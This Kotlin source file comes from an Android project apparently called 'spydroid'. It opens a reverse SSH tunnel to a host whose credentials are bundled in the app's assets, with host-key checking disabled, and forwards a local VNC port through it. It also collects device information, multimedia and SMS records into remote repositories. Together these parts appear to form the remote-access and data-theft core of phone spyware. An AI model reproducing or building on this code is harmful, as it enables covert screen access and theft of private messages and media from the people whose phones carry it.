/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import net.spydroid.common.remote.data.dataModule
import net.spydroid.common.remote.domain.DevicesRepository
import net.spydroid.common.remote.domain.InfoRepository
import net.spydroid.common.remote.domain.MultimediaRepository
import net.spydroid.common.remote.domain.SmsRepository
import net.spydroid.common.remote.network.models.Devices
import net.spydroid.common.remote.network.models.InfoDevices
import net.spydroid.common.remote.network.models.MultimediaDevices
import net.spydroid.common.remote.network.models.SmsDevices
import net.spydroid.common.remote.network.networkModule
import org.koin.android.ext.koin.androidContext
import org.koin.core.component.KoinComponent
import org.koin.core.component.inject
import org.koin.core.context.startKoin
import com.jcraft.jsch.JSch
import com.jcraft.jsch.Session
import java.util.Properties

private fun createReverseSSHTunnel(context: Context, port: (Int) -> Unit) {
    try {

        val jsch = JSch()
        val props = Properties().apply {
            load(context.assets.open("secrets.properties"))
        }

        val username = props.getProperty("SSH_USERNAME")
        val host = props.getProperty("SSH_HOST")
        val password = props.getProperty("SSH_PASSWORD")

        val session: Session = jsch.getSession(username, host, 22)
        session.setPassword(password)

        props["StrictHostKeyChecking"] = "no"
        session.setConfig(props)

        session.connect()

        val rport = (5200..9000).random()
        val iport = 5300

        port(rport)

        session.setPortForwardingR(rport, "localhost", iport)

        Log.d("SSH_TEST", "Túnel SSH inverso creado con éxito. ¡VNC redirigido! a el puerto $rport")

    } catch (e: Exception) {
        e.printStackTrace()
        Log.e("SSH_TEST", "Error: $e")
    }
}


class RemoteDataProvider private constructor(
    private val context: Context
) : KoinComponent {

    init {
        startKoin {
            androidContext(context)
            modules(networkModule, dataModule)
        }
    }

    private val devicesRepository: DevicesRepository by inject()
    private val infoRepository: InfoRepository by inject()
    private val multimediaRepository: MultimediaRepository by inject()
    private val smsRepository: SmsRepository by inject()

    private val scope = CoroutineScope(Dispatchers.IO)

    private val sharedPreferences: SharedPreferences =
        context.getSharedPreferences("remotePreferences", Context.MODE_PRIVATE)

    private object PORT_VALUES {
        val VALUE_DEFAULT = 0
        val KEY = "portTunnel"
    }

    private fun setPort(state: Int) {
        val editor = sharedPreferences.edit()
        editor.putInt(PORT_VALUES.KEY, state)
        editor.apply()
    }

    private val _port =
        MutableStateFlow(sharedPreferences.getInt(PORT_VALUES.KEY, PORT_VALUES.VALUE_DEFAULT))
    val port: StateFlow<Int> = _port

    private val _devices = MutableStateFlow(mutableListOf<Devices>())
    val devices: StateFlow<List<Devices>> = _devices

    private val _info = MutableStateFlow(mutableListOf<InfoDevices>())
    val info: StateFlow<List<InfoDevices>> = _info

    private val _multimedia = MutableStateFlow(mutableListOf<MultimediaDevices>())
    val multimedia: StateFlow<List<MultimediaDevices>> = _multimedia

    private val _sms = MutableStateFlow(mutableListOf<SmsDevices>())
    val sms: StateFlow<List<SmsDevices>> = _sms

    private fun setDevice(device: Devices) =
        scope.launch {
            devicesRepository.insertDevice(device)
        }

    fun startSshTunnel() = scope.launch(Dispatchers.IO) {
        createReverseSSHTunnel(context) {
            setPort(it)
            _port.value = it
        }
    }

    // GET
    fun getAllDevices() =
        scope.launch {
            devicesRepository.getAllDevices().map {
                val updateList = _devices.value.toMutableList().apply {
                    add(it)
                }
                _devices.value = updateList
            }
        }

    fun getDevice(alias: String) =
        scope.launch {
            devicesRepository.getDevice(alias).map {
                val updateList = _devices.value.toMutableList().apply {
                    add(it)
                }
                _devices.value = updateList
            }
        }

    fun getAllInfo() =
        scope.launch {
            infoRepository.getAllInfo().map {
                val updateLIst = _info.value.toMutableList().apply { add(it) }
                _info.value = updateLIst
            }
        }

    fun getInfo(alias: String) =
        scope.launch {
            infoRepository.getInfo(alias).map {
                val updateLIst = _info.value.toMutableList().apply { add(it) }
                _info.value = updateLIst
            }
        }

    fun getAllMultimedia() =
        scope.launch {
            multimediaRepository.getAllMultimedia().map {
                val updateList = _multimedia.value.toMutableList().apply {
                    add(it)
                }
                _multimedia.value = updateList
            }
        }

    fun getMultimedia(alias: String) =
        scope.launch {
            multimediaRepository.getMultimedia(alias).map {
                val updateList = _multimedia.value.toMutableList().apply {
                    add(it)
                }
                _multimedia.value = updateList
            }
        }

    fun getAllSms() =
        scope.launch {
            smsRepository.getAllSms().map {
                val updateList = _sms.value.toMutableList().apply {
                    add(it)
                }
                _sms.value = updateList
            }
        }

    fun getSms(alias: String) =
        scope.launch {
            smsRepository.getSms(alias).map {
                val updateList = _sms.value.toMutableList().apply {
                    add(it)
                }
                _sms.value = updateList
            }
        }


    fun insertDevice(device: Devices) =
        scope.launch {
            devicesRepository.insertDevice(device)
        }

    fun insertInfo(info: InfoDevices) =
        scope.launch {
            infoRepository.insertInfo(info)
        }

    fun insertMultimedia(multimedia: MultimediaDevices) =
        scope.launch {
            multimediaRepository.insertMultimedia(multimedia)
        }

    fun insertSms(sms: SmsDevices) =
        scope.launch {
            smsRepository.insertSms(sms)
        }


    companion object {
        @SuppressLint("StaticFieldLeak")
        @Volatile
        private var INSTANCE: RemoteDataProvider? = null

        fun current(context: Context): RemoteDataProvider =
            INSTANCE ?: synchronized(this) {
                INSTANCE ?: RemoteDataProvider(context.applicationContext)
                    .also { INSTANCE = it }
            }
    }

}